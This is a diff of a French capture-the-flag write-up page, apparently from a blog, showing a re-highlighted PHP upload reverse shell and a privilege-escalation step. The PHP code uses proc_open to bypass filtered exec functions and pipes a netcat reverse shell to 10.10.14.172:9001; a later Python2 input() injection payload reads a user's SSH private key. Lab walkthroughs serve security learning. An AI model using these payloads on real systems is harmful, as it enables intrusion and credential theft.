-</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#34;pipe&#34;</span>,<span style="color:#e6db74">&#34;w&#34;</span>),
-</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#34;file&#34;</span>,<span style="color:#e6db74">&#34;/tmp/error-output.txt&#34;</span>,<span style="color:#e6db74">&#34;a&#34;</span>)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>http<span style="color:#ff79c6">://</span>www<span style="color:#ff79c6">.</span>ebay<span style="color:#ff79c6">.</span>com
+</span></span><span style="display:flex;"><span>http<span style="color:#ff79c6">://</span>www<span style="color:#ff79c6">.</span>google<span style="color:#ff79c6">.</span>fr
+</span></span><span style="display:flex;"><span>http<span style="color:#ff79c6">://</span>www<span style="color:#ff79c6">.</span>t<span style="color:#ff79c6">.</span>co
+</span></span><span style="display:flex;"><span>http<span style="color:#ff79c6">://</span>www<span style="color:#ff79c6">.</span>tmall<span style="color:#ff79c6">.</span>com
+</span></span><span style="display:flex;"><span>http<span style="color:#ff79c6">://</span>www<span style="color:#ff79c6">.</span>google<span style="color:#ff79c6">.</span>com<span style="color:#ff79c6">.</span>br
+</span></span><span style="display:flex;"><span>http<span style="color:#ff79c6">://</span>www<span style="color:#ff79c6">.</span><span style="color:#bd93f9">360.</span>cn
+</span></span><span style="display:flex;"><span>http<span style="color:#ff79c6">://</span>www<span style="color:#ff79c6">.</span>sohu<span style="color:#ff79c6">.</span>com
+</span></span><span style="display:flex;"><span>http<span style="color:#ff79c6">://</span>www<span style="color:#ff79c6">.</span>amazon<span style="color:#ff79c6">.</span>co<span style="color:#ff79c6">.</span>jp
+</span></span><span style="display:flex;"><span>http<span style="color:#ff79c6">://</span>www<span style="color:#ff79c6">.</span>pinterest<span style="color:#ff79c6">.</span>com
+</span></span><span style="display:flex;"><span>http<span style="color:#ff79c6">://</span>www<span style="color:#ff79c6">.</span>netflix<span style="color:#ff79c6">.</span>com
+</span></span><span style="display:flex;"><span>http<span style="color:#ff79c6">://</span>www<span style="color:#ff79c6">.</span>google<span style="color:#ff79c6">.</span>it
+</span></span><span style="display:flex;"><span>http<span style="color:#ff79c6">://</span>www<span style="color:#ff79c6">.</span>google<span style="color:#ff79c6">.</span>ru
+</span></span><span style="display:flex;"><span>http<span style="color:#ff79c6">://</span>www<span style="color:#ff79c6">.</span>microsoft<span style="color:#ff79c6">.</span>com
+</span></span><span style="display:flex;"><span>http<span style="color:#ff79c6">://</span>www<span style="color:#ff79c6">.</span>google<span style="color:#ff79c6">.</span>es
+</span></span><span style="display:flex;"><span>http<span style="color:#ff79c6">://</span>www<span style="color:#ff79c6">.</span>wordpress<span style="color:#ff79c6">.</span>com
+</span></span><span style="display:flex;"><span>http<span style="color:#ff79c6">://</span>www<span style="color:#ff79c6">.</span>gmw<span style="color:#ff79c6">.</span>cn
+</span></span><span style="display:flex;"><span>http<span style="color:#ff79c6">://</span>www<span style="color:#ff79c6">.</span>tumblr<span style="color:#ff79c6">.</span>com
+</span></span><span style="display:flex;"><span>http<span style="color:#ff79c6">://</span>www<span style="color:#ff79c6">.</span>paypal<span style="color:#ff79c6">.</span>com
+</span></span><span style="display:flex;"><span>http<span style="color:#ff79c6">://</span>www<span style="color:#ff79c6">.</span>blogspot<span style="color:#ff79c6">.</span>com
+</span></span><span style="display:flex;"><span>http<span style="color:#ff79c6">://</span>www<span style="color:#ff79c6">.</span>imgur<span style="color:#ff79c6">.</span>com
+</span></span><span style="display:flex;"><span>http<span style="color:#ff79c6">://</span>www<span style="color:#ff79c6">.</span>stackoverflow<span style="color:#ff79c6">.</span>com
+</span></span><span style="display:flex;"><span>http<span style="color:#ff79c6">://</span>www<span style="color:#ff79c6">.</span>aliexpress<span style="color:#ff79c6">.</span>com
+</span></span><span style="display:flex;"><span>http<span style="color:#ff79c6">://</span>www<span style="color:#ff79c6">.</span>naver<span style="color:#ff79c6">.</span>com
+</span></span><span style="display:flex;"><span>http<span style="color:#ff79c6">://</span>www<span style="color:#ff79c6">.</span>ok<span style="color:#ff79c6">.</span>ru
+</span></span><span style="display:flex;"><span>http<span style="color:#ff79c6">://</span>www<span style="color:#ff79c6">.</span>apple<span style="color:#ff79c6">.</span>com
+</span></span><span style="display:flex;"><span>http<span style="color:#ff79c6">://</span>www<span style="color:#ff79c6">.</span>github<span style="color:#ff79c6">.</span>com
+</span></span><span style="display:flex;"><span>http<span style="color:#ff79c6">://</span>www<span style="color:#ff79c6">.</span>chinadaily<span style="color:#ff79c6">.</span>com<span style="color:#ff79c6">.</span>cn
+</span></span><span style="display:flex;"><span>http<span style="color:#ff79c6">://</span>www<span style="color:#ff79c6">.</span>imdb<span style="color:#ff79c6">.</span>com
+</span></span><span style="display:flex;"><span>http<span style="color:#ff79c6">://</span>www<span style="color:#ff79c6">.</span>google<span style="color:#ff79c6">.</span>co<span style="color:#ff79c6">.</span>kr
+</span></span><span style="display:flex;"><span>http<span style="color:#ff79c6">://</span>www<span style="color:#ff79c6">.</span>fc2<span style="color:#ff79c6">.</span>com
+</span></span><span style="display:flex;"><span>http<span style="color:#ff79c6">://</span>www<span style="color:#ff79c6">.</span>jd<span style="color:#ff79c6">.</span>com
+</span></span><span style="display:flex;"><span>http<span style="color:#ff79c6">://</span>www<span style="color:#ff79c6">.</span>blogger<span style="color:#ff79c6">.</span>com
+</span></span><span style="display:flex;"><span>http<span style="color:#ff79c6">://</span>www<span style="color:#ff79c6">.</span><span style="color:#bd93f9">163.</span>com
+</span></span><span style="display:flex;"><span>http<span style="color:#ff79c6">://</span>www<span style="color:#ff79c6">.</span>google<span style="color:#ff79c6">.</span>ca
+</span></span><span style="display:flex;"><span>http<span style="color:#ff79c6">://</span>www<span style="color:#ff79c6">.</span>whatsapp<span style="color:#ff79c6">.</span>com
+</span></span><span style="display:flex;"><span>http<span style="color:#ff79c6">://</span>www<span style="color:#ff79c6">.</span>amazon<span style="color:#ff79c6">.</span>in
+</span></span><span style="display:flex;"><span>http<span style="color:#ff79c6">://</span>www<span style="color:#ff79c6">.</span>office<span style="color:#ff79c6">.</span>com
+</span></span><span style="display:flex;"><span>http<span style="color:#ff79c6">://</span>www<span style="color:#ff79c6">.</span>tianya<span style="color:#ff79c6">.</span>cn
+</span></span><span style="display:flex;"><span>http<span style="color:#ff79c6">://</span>www<span style="color:#ff79c6">.</span>google<span style="color:#ff79c6">.</span>co<span style="color:#ff79c6">.</span>id
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;?</span>php
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">//Upload reverse-shell, bypass exec(), shell_exec(), system(), fsockopen(), passthru()
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">$descriptorspec</span> <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">array</span>(
+</span></span><span style="display:flex;"><span> <span style="color:#bd93f9">0</span> <span style="color:#ff79c6">=&gt;</span> <span style="color:#ff79c6">array</span>(<span style="color:#f1fa8c">&#34;pipe&#34;</span>,<span style="color:#f1fa8c">&#34;r&#34;</span>),  
+</span></span><span style="display:flex;"><span> <span style="color:#bd93f9">1</span> <span style="color:#ff79c6">=&gt;</span> <span style="color:#ff79c6">array</span>(<span style="color:#f1fa8c">&#34;pipe&#34;</span>,<span style="color:#f1fa8c">&#34;w&#34;</span>),
+</span></span><span style="display:flex;"><span> <span style="color:#bd93f9">2</span> <span style="color:#ff79c6">=&gt;</span> <span style="color:#ff79c6">array</span>(<span style="color:#f1fa8c">&#34;file&#34;</span>,<span style="color:#f1fa8c">&#34;/tmp/error-output.txt&#34;</span>,<span style="color:#f1fa8c">&#34;a&#34;</span>)
 </span></span><span style="display:flex;"><span>);
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>$cwd<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;/tmp&#39;</span>;
-</span></span><span style="display:flex;"><span>$env<span style="color:#f92672">=</span><span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#39;some_option&#39;</span><span style="color:#f92672">=&gt;</span><span style="color:#e6db74">&#39;aeiou&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">$cwd</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;/tmp&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">$env</span><span style="color:#ff79c6">=</span><span style="color:#ff79c6">array</span>(<span style="color:#f1fa8c">&#39;some_option&#39;</span><span style="color:#ff79c6">=&gt;</span><span style="color:#f1fa8c">&#39;aeiou&#39;</span>);
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>$process<span style="color:#f92672">=</span><span style="color:#a6e22e">proc_open</span>(<span style="color:#e6db74">&#39;sh&#39;</span>,$descriptorspec,$pipes,$cwd,$env);
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">$process</span><span style="color:#ff79c6">=</span>proc_open(<span style="color:#f1fa8c">&#39;sh&#39;</span>,<span style="color:#8be9fd;font-style:italic">$descriptorspec</span>,<span style="color:#8be9fd;font-style:italic">$pipes</span>,<span style="color:#8be9fd;font-style:italic">$cwd</span>,<span style="color:#8be9fd;font-style:italic">$env</span>);
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">is_resource</span>($process)){
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span>(is_resource(<span style="color:#8be9fd;font-style:italic">$process</span>)){
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fwrite</span>($pipes[<span style="color:#ae81ff">0</span>],<span style="color:#e6db74">&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.14.172 9001 &gt;/tmp/f&#39;</span>);
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fclose</span>($pipes[<span style="color:#ae81ff">0</span>]);
+</span></span><span style="display:flex;"><span>    fwrite(<span style="color:#8be9fd;font-style:italic">$pipes</span>[<span style="color:#bd93f9">0</span>],<span style="color:#f1fa8c">&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.14.172 9001 &gt;/tmp/f&#39;</span>);
+</span></span><span style="display:flex;"><span>    fclose(<span style="color:#8be9fd;font-style:italic">$pipes</span>[<span style="color:#bd93f9">0</span>]);
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">stream_get_contents</span>($pipes[<span style="color:#ae81ff">1</span>]);
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fclose</span>($pipes[<span style="color:#ae81ff">1</span>]);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">echo</span> stream_get_contents(<span style="color:#8be9fd;font-style:italic">$pipes</span>[<span style="color:#bd93f9">1</span>]);
+</span></span><span style="display:flex;"><span>    fclose(<span style="color:#8be9fd;font-style:italic">$pipes</span>[<span style="color:#bd93f9">1</span>]);
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    $return_value <span style="color:#f92672">=</span> <span style="color:#a6e22e">proc_close</span>($process);
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">$return_value</span> <span style="color:#ff79c6">=</span> proc_close(<span style="color:#8be9fd;font-style:italic">$process</span>);
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;command returned </span><span style="color:#e6db74">$return_value\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">echo</span> <span style="color:#f1fa8c">&#34;command returned </span><span style="color:#f1fa8c">$return_value\n</span><span style="color:#f1fa8c">&#34;</span>;
 </span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
-</span></span></span></code></pre></div><blockquote>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">?&gt;</span>
+</span></span></code></pre></div><blockquote>
 <p>J’utilise un reverse shell spécial qui bypass exec(), shell_exec() et toutes les fonctions de ce type car elles sont filtrées</p></blockquote>
 <p>On lance notre netcat, on upload le fichier puis on le visite&hellip;</p>
 <h1 id="lateral-move">Lateral Move</h1>
@@ -363,19 +367,19 @@
 <pre class="mermaid">SyntaxError: Missing parentheses in call to 'print'. Did you mean print("Website is up")?
 </pre>
 <p>On peut cat le <code>.py</code> pour essayer de comprendre un peu mieux ce qu&rsquo;il se passe:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">import</span> requests
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;Enter URL here:&#34;</span>)
-</span></span><span style="display:flex;"><span>page <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url)
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> page<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span>:
-</span></span><span style="display:flex;"><span>	print <span style="color:#e6db74">&#34;Website is up&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
-</span></span><span style="display:flex;"><span>	print <span style="color:#e6db74">&#34;Website is down&#34;</span>
+</span></span><span style="display:flex;"><span>url <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">input</span>(<span style="color:#f1fa8c">&#34;Enter URL here:&#34;</span>)
+</span></span><span style="display:flex;"><span>page <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>get(url)
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> page<span style="color:#ff79c6">.</span>status_code <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">200</span>:
+</span></span><span style="display:flex;"><span>	<span style="color:#8be9fd;font-style:italic">print</span> <span style="color:#f1fa8c">&#34;Website is up&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">else</span>:
+</span></span><span style="display:flex;"><span>	<span style="color:#8be9fd;font-style:italic">print</span> <span style="color:#f1fa8c">&#34;Website is down&#34;</span>
 </span></span></code></pre></div><p>Cette syntaxe du print est propre à python2, et on peut se douter que ceci n’a pas été laissé au hasard</p>
 <p>On cherche donc des vulnérabilités de python2 sur google, et assez vite on peut se rendre compte que toutes les input en python2 sont injectables</p>
 <p>En entrant un payload dans un input, ce dernier est executé avant que le programme plante</p>
 <p>On va donc lancer le fichier avec python2 puis entrer ce payload dans l’input:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>__import__(<span style="color:#e6db74">&#39;os&#39;</span>)<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;cat /home/developer/.ssh/id_rsa&#34;</span>)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">__import__</span>(<span style="color:#f1fa8c">&#39;os&#39;</span>)<span style="color:#ff79c6">.</span>system(<span style="color:#f1fa8c">&#34;cat /home/developer/.ssh/id_rsa&#34;</span>)
 </span></span></code></pre></div><p>Ce dernier va simplement lire la clé SSH de l’user <code>developer</code></p>
 <p>Bien évidemment, en lançant le .py, il retourne une permission denied, puisque le fichier n’a pas le <code>setuid bit</code></p>
 <p><img src="https://user-images.githubusercontent.com/77807503/206530087-0f7a497f-3e72-497a-b9fb-674a607980bb.png" alt="2022-12-08-184616_930x1026_scrot"></p>
